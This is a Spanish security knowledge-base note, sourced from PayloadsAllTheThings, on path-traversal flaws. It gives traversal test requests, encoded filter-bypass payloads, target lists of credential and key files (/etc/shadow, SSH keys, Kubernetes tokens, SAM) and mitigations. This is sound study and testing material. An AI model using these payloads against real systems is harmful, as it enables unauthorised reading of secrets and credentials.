---
tags:
  - seguridad-web
  - owasp
  - path-traversal
aliases:
  - Path Traversal
  - Directory Traversal
  - Traversal de directorios
---

# Path Traversal

**El path traversal (o directory traversal) permite acceder a archivos y directorios arbitrarios del sistema manipulando rutas con secuencias `../`.** Se aprovecha de un mecanismo de *lectura* sin validar la ruta proporcionada por el usuario.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Cuando la aplicación construye una ruta de archivo a partir de entrada del usuario sin normalizarla, los caracteres `..` permiten subir al directorio padre y salir del directorio previsto, leyendo archivos como `/etc/passwd` o `C:\Windows\win.ini`. A diferencia de la [[Inclusión de archivos (LFI-RFI)]], aquí el contenido normalmente solo se *lee*, no se ejecuta.

## Detección y pruebas
Prueba parámetros que referencien archivos (descargas, plantillas, imágenes, idiomas) con secuencias de traversal y un archivo testigo del SO:

```
/?file=../../../../etc/passwd            # Linux
/?file=..\..\..\..\windows\win.ini       # Windows
```

`win.ini` y `license.rtf` existen siempre en Windows: buenos PoC. Si un filtro elimina las secuencias, prueba las codificaciones de abajo.

## Explotación / payloads
**Variantes y codificaciones de `../`:**

```
../        ..\        ..\/
%2e%2e%2f                  # URL encoding ( . = %2e, / = %2f, \ = %5c )
%252e%252e%252f            # doble URL encoding
%c0%ae%c0%ae%c0%af         # UTF-8 overlong
%uff0e%uff0e%u2215         # unicode
..././   ...\.\            # mangled (WAF que borra ../)
..;/                       # Tomcat tras Nginx (proxy inverso)
.%00./.%00./etc/passwd     # null byte
```

**Archivos interesantes en Linux:**

```
/etc/passwd            /etc/shadow            /etc/hosts
/proc/self/environ     /proc/self/cmdline     /proc/version
/proc/net/tcp          /proc/net/arp
/home/$USER/.ssh/id_rsa     /home/$USER/.bash_history
/etc/mysql/my.cnf
/run/secrets/kubernetes.io/serviceaccount/token   # Kubernetes
```

**Archivos interesantes en Windows:**

```
C:\Windows\win.ini
C:\windows\system32\license.rtf
c:/inetpub/wwwroot/web.config
c:/windows/repair/sam        c:/windows/repair/system
c:/unattend.xml              c:/sysprep/sysprep.inf
```

**Técnicas específicas:** UNC share en Windows (`\\localhost\c$\windows\win.ini`, además fuerza autenticación NTLM), ASP.NET cookieless (`/(S(X))/`) para sortear filtros de URL, e IIS Short Name para enumerar nombres 8.3.

## Mitigación
- Evitar pasar rutas del usuario al sistema de archivos; usar un **identificador indirecto** mapeado a una lista de permitidos.
- **Canonicalizar** la ruta (resolver `..`, symlinks) y verificar que el resultado quede dentro del directorio base permitido.
- Rechazar bytes nulos y secuencias codificadas tras decodificar; decodificar una sola vez.
- Privilegios mínimos del proceso web y permisos de archivo restrictivos.

## Herramientas
- **DotDotPwn** — fuzzer de directory traversal.
- **shortscan** / **IIS-ShortName-Scanner** — enumeración de nombres cortos en IIS.

---
🔗 Relacionado: [[Inclusión de archivos (LFI-RFI)]] · [[Subida de archivos insegura]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) (MIT, © Swissky)
